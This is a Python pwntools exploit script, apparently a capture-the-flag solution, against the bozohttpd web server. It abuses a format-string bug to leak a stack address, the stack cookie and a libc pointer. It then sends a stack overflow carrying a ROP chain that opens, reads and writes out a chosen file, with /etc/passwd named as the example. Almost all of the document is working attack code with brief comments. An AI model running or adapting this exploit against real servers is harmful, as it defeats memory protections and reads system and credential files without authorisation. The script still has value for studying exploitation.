from pwn import *
from ropper import RopperService
context.arch = 'amd64'

HOST= '127.0.0.1'
PORT= 8080

if args['REMOTE']:
	HOST = '****'
	PORT = 8080

def get_libc_path():
	if args['REMOTE']:
		return "./libs/libc-2.25.so"
	else:
		return "./libs/libc-2.24.so"


libc=ELF(get_libc_path())
e=ELF("./bozohttpd")

def request(payload, debug = False, interactive = False):
	r = connect(HOST,PORT)
	
	if args['GDB'] and debug:
		#open new window and attach gdb
		commands=["bp 0x000000000040809F", "c"]
		gdb.attach("bozohttpd", gdbscript="\n".join(commands))
	
	payload=payload.encode("hex")
	r.send("GET /00" + payload + " HTTP/1.1\r\n")
	r.send("Host: http://localhost:8080\r\n")
	r.send("\r\n")
	
	page = r.recvuntil("</html>\n")
	if interactive:
		r.interactive()
		return None
	
	more = r.recvall()
	if more.strip():
		print more.replace("\x00"," ")
	r.close()
	return page.split(":")[5]

def leak_cookie():
	payload = "%88$p"
	blob = request(payload)
	return int(blob[2:],16)
	
def leak_stack():
	payload = "%8$p"
	blob = request(payload)
	return int(blob[2:],16)	

def leak_byte(addr):
	payload = "%57$s\x00"
	payload += "a"*(256-len(payload))
	payload += p64(addr)

	blob = request(payload)
	if blob == "":
		return 0x00
	
	return u8(blob[0])
    
def leak_8B(addr):
	r = 0x0
	for a in range(addr+7,addr-1,-1):
		r *= 0x100
		r += leak_byte(a)
    
	return r
	

#global instance of ropper
rs = None

def ropper_init():
	global rs

	# options for ropper
	options = {'color' : False,     # if gadgets are printed, use colored output: default: False
            'badbytes': '',   # bad bytes which should not be in addresses or ropchains; default: ''
            'all' : False,      # Show all gadgets, this means to not remove double gadgets; default: False
            'inst_count' : 6,   # Number of instructions in a gadget; default: 6
            'type' : 'rop',     # rop, jop, sys, all; default: all
            'detailed' : False} # if gadgets are printed, use detailed output; default: False

	rs = RopperService(options)
	rs.addFile(get_libc_path())
	rs.setArchitectureFor(name=get_libc_path(), arch='x86_64')
	
	print "loading gadgets from libc..."
	rs.loadGadgetsFor() 


def ropper_find_gadget(gadget_str):
	
	for file, gadget in rs.search(search=gadget_str):
		print "gadget found: " + gadget_str
		return gadget.address
		
#leak any address pointing to the stack to overcome ASLR
leaked_stack_addr = leak_stack()
print "leaked stack addr " + hex(leaked_stack_addr)

#compute address of our payload on the stack
#distance between leaked pointer and our payload is always the same
payload_addr = leaked_stack_addr - 0x360
print "address of our payload = " + hex(payload_addr)

#leak stack cookie
cookie = leak_cookie()
print "leaked stack cookie = " + hex(cookie)
    
#leak some libc function to compute address of libc base
setsockopt_addr = leak_8B(e.got['setsockopt'])
print "setsockopt = " + hex(setsockopt_addr)

libc_base = setsockopt_addr - libc.symbols["setsockopt"]

print "address of libc base = " + hex(libc_base)

#find all necessary gadgets
ropper_init()
pop_rax_addr = ropper_find_gadget('pop rax; ret;') + libc_base
pop_rdi_addr = ropper_find_gadget('pop rdi; ret;') + libc_base
pop_rsi_addr = ropper_find_gadget('pop rsi; ret;') + libc_base
pop_rdx_addr = ropper_find_gadget('pop rdx; ret;') + libc_base
syscall_addr = ropper_find_gadget('syscall; ret;') + libc_base

payload = "a"*504 + p64(cookie) + "a"*8

#functions helpful for creating ROP
def pop_rdi(val):
	return p64(pop_rdi_addr) + p64(val)

def pop_rsi(val):
	return p64(pop_rsi_addr) + p64(val)
	
def pop_rdx(val):
	return p64(pop_rdx_addr) + p64(val)
	
def pop_rax(val):
	return p64(pop_rax_addr) + p64(val)

def get_rop_syscall(sys_num, arg1=None, arg2=None, arg3=None):
	s = pop_rax(sys_num)
	if not arg1 is None:
		s += pop_rdi(arg1)
	if not arg2 is None:
		s += pop_rsi(arg2)
	if not arg3 is None:
		s += pop_rdx(arg3)
	s += p64(syscall_addr)
	return s

def get_rop_read_file(filepath, max_size):
	#ROP chain to open file, read file to buffor, write buffor
	#some consts for ROP
	writable_addr = 0x0000000000614480
	fd = 5
	stdout = 1
	filename_addr = payload_addr + 0x308

	#open('/etc/passwd', O_RDONLY ,0)
	payload = get_rop_syscall(constants.SYS_open, filename_addr, constants.O_RDONLY, 0x0)
	#read(fd, memory_w, size)
	payload += get_rop_syscall(constants.SYS_read, fd, writable_addr, max_size)
	#write(stdout, memory_w, size)
	payload += get_rop_syscall(constants.SYS_write, stdout, writable_addr, max_size)
	#exit(0)
	payload += get_rop_syscall(constants.SYS_exit, 0x0)
	#add path of the file
	payload += filepath+"\x00"
	
	return payload

payload += get_rop_read_file(args['PATH'],int(args['SIZE']))

request(payload,debug=True)
